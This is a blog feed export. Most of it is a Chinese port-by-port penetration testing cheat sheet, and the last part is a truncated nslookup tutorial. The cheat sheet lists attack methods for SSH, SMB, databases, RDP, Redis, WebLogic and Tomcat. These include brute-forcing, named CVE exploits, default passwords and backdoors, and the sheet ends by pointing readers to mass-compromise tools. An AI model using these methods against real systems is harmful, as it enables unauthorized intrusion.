id="22端口渗透剖析"><a href="#22端口渗透剖析" class="headerlink" title="22端口渗透剖析"></a>22端口渗透剖析</h1><p>SSH：(secure shell)是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。</p><p>通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p><blockquote><p>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。</p><p>（2）防火墙SSH后门。</p><blockquote><p><a href="https://www.secpulse.com/archives/69093.html">https://www.secpulse.com/archives/69093.html</a></p></blockquote><p>（3）28退格 OpenSSL</p><p>（4）openssh 用户枚举 CVE-2018-15473。</p><blockquote><p><a href="https://www.anquanke.com/post/id/157607">https://www.anquanke.com/post/id/157607</a></p></blockquote></blockquote><h1 id="23端口渗透剖析"><a href="#23端口渗透剖析" class="headerlink" title="23端口渗透剖析"></a>23端口渗透剖析</h1><p>telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。</p><blockquote><p>（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。</p><p>（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。</p></blockquote><h1 id="25-x2F-465端口渗透剖析"><a href="#25-x2F-465端口渗透剖析" class="headerlink" title="25&#x2F;465端口渗透剖析"></a>25&#x2F;465端口渗透剖析</h1><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件</p><blockquote><p>默认端口：25（smtp）、465（smtps）</p><p>（1）爆破：弱口令</p><p>（2）未授权访问</p></blockquote><h1 id="53端口渗透剖析"><a href="#53端口渗透剖析" class="headerlink" title="53端口渗透剖析"></a>53端口渗透剖析</h1><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。</p><blockquote><p>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。</p><blockquote><p><a href="https://www.seebug.org/vuldb/ssvid-96718">https://www.seebug.org/vuldb/ssvid-96718</a></p></blockquote><p>（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。</p><blockquote><p><a href="https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc</a></p></blockquote><p>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。</p><blockquote><p><a href="http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml">http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml</a></p></blockquote><p>（4）DNS劫持。</p><blockquote><p><a href="https://blog.csdn.net/qq_32447301/article/details/77542474">https://blog.csdn.net/qq_32447301/article/details/77542474</a></p></blockquote></blockquote><h1 id="80端口渗透剖析"><a href="#80端口渗透剖析" class="headerlink" title="80端口渗透剖析"></a>80端口渗透剖析</h1><p>80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL<a href="http://www.05112.com/">注入</a>的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。</p><blockquote><p>（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。</p><p>（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。</p><p>（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。</p><p>（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。</p><p>（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。</p><p>（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。</p><p>（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。</p></blockquote><h1 id="135端口渗透剖析"><a href="#135端口渗透剖析" class="headerlink" title="135端口渗透剖析"></a>135端口渗透剖析</h1><p>135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’<a href="http://www.05112.com/">病毒</a>就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:</p><blockquote><p>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。</p><blockquote><p><a href="https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html">https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html</a></p></blockquote><p>（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。</p><blockquote><p><a href="https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html">https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html</a></p></blockquote></blockquote><h1 id="139-x2F-445端口渗透剖析"><a href="#139-x2F-445端口渗透剖析" class="headerlink" title="139&#x2F;445端口渗透剖析"></a>139&#x2F;445端口渗透剖析</h1><p>139端口是为‘NetBIOS SessionService’提供的，主要用于提供<strong>windows文件和打印机共享以及UNIX中的Samba服务</strong>。445端口也用于提供<strong>windows文件和打印机共享</strong>，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139&#x2F;445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</p><blockquote><p>（1）对于开放139&#x2F;445端口的主机，一般尝试利用溢出漏洞对远程主机进行<strong>溢出攻击</strong>，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。</p><blockquote><p><a href="https://blog.csdn.net/qq_41880069/article/details/82908131">https://blog.csdn.net/qq_41880069/article/details/82908131</a></p></blockquote><p>（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。</p><blockquote><p><a href="https://blog.csdn.net/god_7z1/article/details/6773652">https://blog.csdn.net/god_7z1/article/details/6773652</a></p></blockquote><p>（3）对于开放139&#x2F;445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。</p><blockquote><p><a href="https://blog.warhut.cn/dmbj/145.html">https://blog.warhut.cn/dmbj/145.html</a></p></blockquote><p>（4）对于开放139&#x2F;445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</p></blockquote><h1 id="1433端口渗透剖析"><a href="#1433端口渗透剖析" class="headerlink" title="1433端口渗透剖析"></a>1433端口渗透剖析</h1><p>1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP&#x2F;IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。</p><blockquote><p>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。</p><blockquote><p><a href="https://blog.csdn.net/gxj022/article/details/4593015">https://blog.csdn.net/gxj022/article/details/4593015</a></p></blockquote><p>（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。</p><blockquote><p><a href="https://blog.csdn.net/kali_linux/article/details/50499576%EF%BC%89">https://blog.csdn.net/kali_linux/article/details/50499576）</a></p></blockquote><p>（3）嗅探技术同样能嗅探到SQL Server的登录密码。</p><p>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。</p></blockquote><h1 id="1521端口渗透剖析"><a href="#1521端口渗透剖析" class="headerlink" title="1521端口渗透剖析"></a>1521端口渗透剖析</h1><p>1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：</p><blockquote><p>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。</p><p>（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</p><p>（3）在注入点直接创建java，执行系统命令。</p><p>（4）<a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</a></p></blockquote><h1 id="2049端口渗透剖析"><a href="#2049端口渗透剖析" class="headerlink" title="2049端口渗透剖析"></a>2049端口渗透剖析</h1><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP&#x2F;IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p><blockquote><p>未授权访问。</p><p><a href="https://www.freebuf.com/articles/network/159468.html">https://www.freebuf.com/articles/network/159468.html</a></p><p><a href="http://www.secist.com/archives/6192.htm">http://www.secist.com/archives/6192.htm</a></p></blockquote><h1 id="3306端口渗透剖析"><a href="#3306端口渗透剖析" class="headerlink" title="3306端口渗透剖析"></a>3306端口渗透剖析</h1><p>3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:</p><blockquote><p>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。</p><p>（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。</p><p>（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。</p></blockquote><h1 id="3389端口渗透剖析"><a href="#3389端口渗透剖析" class="headerlink" title="3389端口渗透剖析"></a>3389端口渗透剖析</h1><p>3389是<strong>windows远程桌面服务</strong>默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。</p><blockquote><p>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。</p><p>（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。</p><p>（3）Shift粘滞键后门：5次shift后门</p><p>（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。</p><p>（5）爆破3389端口。这里还是推荐使用hydra爆破工具。对RDP暴力破解</p><p>（6）ms12_020死亡蓝屏攻击。</p><blockquote><p><a href="https://www.cnblogs.com/R-Hacker/p/9178066.html">https://www.cnblogs.com/R-Hacker/p/9178066.html</a></p></blockquote><p>（7）<a href="https://www.cnblogs.com/backlion/p/9429738.html">https://www.cnblogs.com/backlion/p/9429738.html</a></p><p>（8）RDP远程桌面漏洞（CVE-2019-0708）</p><p>（9）MSF开启RDP、注册表开启RDP</p></blockquote><h1 id="4899端口渗透剖析"><a href="#4899端口渗透剖析" class="headerlink" title="4899端口渗透剖析"></a>4899端口渗透剖析</h1><p>**4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP&#x2F;IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：</p><blockquote><p>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。</p><p>（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。</p></blockquote><h1 id="5432端口渗透剖析"><a href="#5432端口渗透剖析" class="headerlink" title="5432端口渗透剖析"></a>5432端口渗透剖析</h1><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p><blockquote><p>（1）爆破：弱口令：postgres postgres</p><p>（2）缓冲区溢出：CVE-2014-2669。（<a href="http://drops.xmd5.com/static/drops/tips-6449.html%EF%BC%89">http://drops.xmd5.com/static/drops/tips-6449.html）</a></p><p>（3）远程代码执行：CVE-2018-1058。（<a href="https://www.secpulse.com/archives/69153.html%EF%BC%89">https://www.secpulse.com/archives/69153.html）</a></p></blockquote><h1 id="5631端口渗透剖析"><a href="#5631端口渗透剖析" class="headerlink" title="5631端口渗透剖析"></a>5631端口渗透剖析</h1><p>5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意<a href="http://www.2cto.com/soft">下载</a>保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。</p><blockquote><p>PcAnyWhere提权。（<a href="https://blog.csdn.net/Fly_hps/article/details/80377199%EF%BC%89">https://blog.csdn.net/Fly_hps/article/details/80377199）</a></p></blockquote><h1 id="5900端口渗透剖析"><a href="#5900端口渗透剖析" class="headerlink" title="5900端口渗透剖析"></a>5900端口渗透剖析</h1><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放<a href="http://www.2cto.com/ym">源码</a>软件，远程控制能力强大，高效实用，其性能可以和<a href="http://www.2cto.com/os/windows/">windows</a>和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p><blockquote><p>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。</p><p>（2）cain同样支持对VNC的嗅探，同时支持端口修改。</p><p>（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。</p><p>（4）VNC拒绝服务攻击（CVE-2015-5239）。（<a href="http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html">http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html</a>)</p><p>（5）VNC权限提升（CVE-2013-6886）</p></blockquote><h1 id="6379端口渗透剖析"><a href="#6379端口渗透剖析" class="headerlink" title="6379端口渗透剖析"></a>6379端口渗透剖析</h1><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><blockquote><p>（1）爆破：弱口令</p><p>（2）未授权访问+配合ssh key提权。（<a href="http://www.alloyteam.com/2017/07/12910/%EF%BC%89">http://www.alloyteam.com/2017/07/12910/）</a></p><p>（3）主从复制rce</p><blockquote><p><a href="http://hetianlab.com/expc.do?ec=ECID9f92-ff93-4a94-a821-f0b968ef4985">http://hetianlab.com/expc.do?ec=ECID9f92-ff93-4a94-a821-f0b968ef4985</a></p></blockquote></blockquote><h1 id="7001-x2F-7002端口渗透剖析"><a href="#7001-x2F-7002端口渗透剖析" class="headerlink" title="7001&#x2F;7002端口渗透剖析"></a>7001&#x2F;7002端口渗透剖析</h1><p>7001&#x2F;7002通常是weblogic中间件端口</p><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器</p><blockquote><p>（1）弱口令、爆破，弱密码一般为weblogic&#x2F;Oracle@123 or weblogic</p><p>（2）管理后台部署 war 后门</p><p>（3）SSRF</p><blockquote><p>Weblogic_ssrf实例：<br><a href="http://hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017021014312200001">http://hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017021014312200001</a></p></blockquote><p>（4）反序列化漏洞</p><blockquote><p><a href="https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</a></p></blockquote><p>（5）weblogic_uac</p><blockquote><p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p><p><a href="https://bbs.pediy.com/thread-224954.html">https://bbs.pediy.com/thread-224954.html</a></p><p><a href="https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</a></p></blockquote><p>（6）CNVD-C-2019-48814 WebLogic反序列化远程命令执行： </p><blockquote><p><a href="http://hetianlab.com/expc.do?ec=ECID3f28-5c9a-4f95-999d-68fa2fa7b7aa">http://hetianlab.com/expc.do?ec=ECID3f28-5c9a-4f95-999d-68fa2fa7b7aa</a></p></blockquote></blockquote><h1 id="8080端口渗透剖析"><a href="#8080端口渗透剖析" class="headerlink" title="8080端口渗透剖析"></a>8080端口渗透剖析</h1><p>Tomcat 服务器是一个开源的轻量级Web应用服务器,在中小型系统和并发量小的场合下被普遍使用,是开发和调试Servlet、JSP 程序的首选</p><p>8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：</p><blockquote><p>（1）Tomcat远程代码执行漏洞（CVE-2019-0232）（<a href="https://www.freebuf.com/column/159200.html%EF%BC%89">https://www.freebuf.com/column/159200.html）</a></p><blockquote><p>CVE-2019-0232 Tomcat远程代码执行漏洞：<br><a href="http://hetianlab.com/expc.do?ec=ECIDefcf-3af2-438f-848f-8dc0f9e6b821">http://hetianlab.com/expc.do?ec=ECIDefcf-3af2-438f-848f-8dc0f9e6b821</a></p></blockquote><p>（2）Tomcat任意文件上传。（CVE-2017-12615）（<a href="http://liehu.tass.com.cn/archives/836%EF%BC%89">http://liehu.tass.com.cn/archives/836）</a></p><p>（3）Tomcat远程代码执行&amp;信息泄露。（<a href="https://paper.seebug.org/399/%EF%BC%89">https://paper.seebug.org/399/）</a></p><p>（4）Jboss远程代码执行。（<a href="http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html%EF%BC%89">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）</a></p><p>（5）Jboss反序列化漏洞。（<a href="https://www.zybuluo.com/websec007/note/838374%EF%BC%89">https://www.zybuluo.com/websec007/note/838374）</a></p><p>（6）Jboss漏洞利用。（<a href="https://blog.csdn.net/u011215939/article/details/79141624%EF%BC%89">https://blog.csdn.net/u011215939/article/details/79141624）</a></p><p>（7）tomcat 管理页面弱口令getshell</p></blockquote><h1 id="27017端口渗透剖析"><a href="#27017端口渗透剖析" class="headerlink" title="27017端口渗透剖析"></a>27017端口渗透剖析</h1><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p><blockquote><p>（1）爆破：弱口令</p><p>（2）未授权访问；（<a href="http://www.cnblogs.com/LittleHann/p/6252421.html%EF%BC%89">http://www.cnblogs.com/LittleHann/p/6252421.html）</a></p><p>（3）<a href="http://www.tiejiang.org/19157.htm">http://www.tiejiang.org/19157.htm</a></p></blockquote><p>-————————————————————–<br>以上的端口渗透原理只是用作分析，现在网上有很多自动的端口<a href="http://www.05112.com/">入侵</a>工具，比如445批量抓鸡器或者1433批量抓鸡器。大家有兴趣的可以去网上<a href="http://www.2cto.com/soft">下载</a>试用。————————————————————</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="http://www.pinlue.com/article/2018/09/1119/337041546717.html">http://www.pinlue.com/article/2018/09/1119/337041546717.html</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/8833316.html">黑客常用端口利用总结</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nslookup使用</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/nslookup%E4%BD%BF%E7%94%A8.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/nslookup%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><p>nslookup(Name Server Lookup)是一种<strong>网络管理命令</strong>，用于从 DNS 服务器查询<a href="https://dnspod.cloud.tencent.com/">域名</a>、IP或其他 DNS 记录信息。</p><p>nslookup 有两种工作模式，<strong>交互模式</strong>和<strong>非交互模式</strong>。在交互模式下，用户可以向域名服务器查询各类主机、域名的信息，或者输出域名中的主机列表。在非交互模式下，针对一个主机或域名仅仅获取特定的名称或所需信息。</p><ul><li>进入交互模式有两种方式：</li></ul><blockquote><p>（1）直接输入 nslookup 命令，不加任何参数，此时 nslookup 会连接到默认的域名服务器（&#x2F;etc&#x2F;resolv.conf的第一个DNS地址）； </p><p>（2）第一个参数是连字符（-），第二个参数是域名服务器的主机名或IP，即<code>nslookup - SERVER | IP</code>。</p></blockquote><ul><li>其他方式则进入非交互模式，比如nslookup NAME查询域名对应的IP。</li></ul><h1 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup [-OPTION] [NAME | -] [SERVER]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">NAME 为域名，SERVER 为域名服务器地址</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">常用</span></span><br><span class="line">nslookup -qt=type domain [dns-server]</span><br><span class="line">nslookup -type=type domain [dns-server]</span><br></pre></td></tr></table></figure><h1 id="选项说明"><a href="#选项说明" class="headerlink" title="选项说明"></a>选项说明</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-query=TYPE        设置查询的类型。等同交互命令 set type=VALUE。VALUE 取值见下文</span><br><span class="line">-timeout=NUMBER    设置等待响应的超时时间，单位秒。等同交互命令 set timeout=NUMBER</span><br></pre></td></tr></table></figure><h1 id="交互命令"><a href="#交互命令" class="headerlink" title="交互命令"></a>交互命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HOST [SERVER]</span><br><span class="line">查询域名对应的地址。如果指定 SERVER 则使用指定的域名服务器解析</span><br><span class="line">server DOMAIN</span><br><span class="line">指定域名服务器</span><br><span class="line">lserver DOMAIN</span><br><span class="line">改变默认域名服务器</span><br><span class="line">exit</span><br><span class="line">退出交互模式</span><br><span class="line">set KEYWORD[=VALUE]</span><br><span class="line">此命令用于更改影响查找的状态信息。有效关键字为：</span><br><span class="line">all</span><br><span class="line">打印所有 KEYWORD 当前配置</span><br><span class="line">class=VALUE</span><br><span class="line">改变 DNS class，VALUE 可取值 IN(Internet)、CH(Chaos)、HS(Hesiod)和 ANY，默认 IN。DNS class 用于指定信息的协议组</span><br><span class="line">[no]debug</span><br><span class="line">在搜索时打开或关闭完整响应数据包和任何中间响应数据包的显示。默认 nodebug，简写 [no]deb</span><br><span class="line">[no]d2</span><br><span class="line">打开或关闭调试模式。这将显示有关 nslookup 正在执行的操作的更多信息。默认 nod2</span><br><span class="line">domain=NAME</span><br><span class="line">设置搜索列表</span><br><span class="line">[no]search</span><br><span class="line">如果查找请求包含至少一个句点但没有以尾随句点结束，则将域搜索列表中的域名追加到请求，直到收到应答。默认 search</span><br><span class="line">port=VALUE</span><br><span class="line">修改默认的TCP/UDP域名服务器端口。默认 53</span><br><span class="line">type=VALUE</span><br><span class="line">更改查询的类型。可取值 A(A记录)、CNAME(CNAME记录)、NS(域名服务器记录)、MX(邮件交换记录)、PTR(反向记录)等。大小写不敏感，默认 A(Address)</span><br><span class="line">[no]recurse</span><br><span class="line">如果域名服务器没有该信息，请告诉它查询其他服务器。默认 recurse，简写 [no]rec</span><br><span class="line">retry=NUMBER</span><br><span class="line">设置重试次数</span><br><span class="line">timeout=NUMBER</span><br><span class="line">设置等待响应的超时时间，单位秒</span><br><span class="line">[no]vc</span><br><span class="line">打开或关闭发送请求到服务器使用虚拟电路。默认 novc</span><br><span class="line">[no]fail</span><br><span class="line">如果域名服务器响应 SERVFAIL 或推荐（nofail）或终止查询（fail），尝试下一个名称服务器。默认不尝试(nofail)</span><br></pre></td></tr></table></figure><h1 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h1><ol><li>在非交互模式下正向解析，查询域名信息。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br><span class="line">Server:10.123.119.98</span><br><span class="line">Address:10.123.119.98#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address: 39.156.69.79</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address: 220.181.38.148</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210021449323.png" alt="image-20221002144919107" style="zoom:50%;" /><ol start="2"><li>在交互模式下正向解析，查询域名信息。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">baidu.com</span></span><br><span class="line">Server:10.123.119.98</span><br><span class="line">Address:10.123.119.98#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address: 220.181.38.148</span><br><span class="line">Name:baidu.com</span><br><span class="line">Address: 39.156.69.79</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><p>最后一个交互命令 exit 表示退</p><ol start="3"><li>反向解析，通过 IP 查询对应的域名。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup 209.132.183.105</span><br><span class="line">Server:10.123.119.98</span><br><span class="line">Address:10.123.119.98#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">105.183.132.209.in-addr.arpaname = redirect.redhat.com.</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br></pre></td></tr></table></figure><ol start="4"><li>查询域名别名。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=cname www.baidu.com</span><br><span class="line">Server:10.123.119.98</span><br><span class="line">Address:10.123.119.98#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.comcanonical name = www.a.shifen.com.</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br></pre></td></tr></table></figure><p>不知道为什么，查询域名别名时需要在域名前面加上 www，不然会得到如下结果：</p><figure 